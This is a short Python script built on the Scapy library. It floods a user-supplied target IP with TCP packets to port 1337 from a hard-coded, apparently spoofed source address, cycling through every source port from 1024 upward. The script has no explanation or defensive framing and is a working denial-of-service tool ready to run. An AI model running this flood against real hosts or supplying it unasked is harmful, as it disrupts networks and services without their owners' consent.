from scapy.all import *
def flood(src, tgt):
    for sport in range(1024, 65535):
        L3 = IP(src=src,dst=tgt)
        L4 = TCP(sport=sport, dport=1337)
        pkt = L3/L4
        send(pkt)

src = "192.168.220.150"
tgt = input("IP: ")
flood(src, tgt)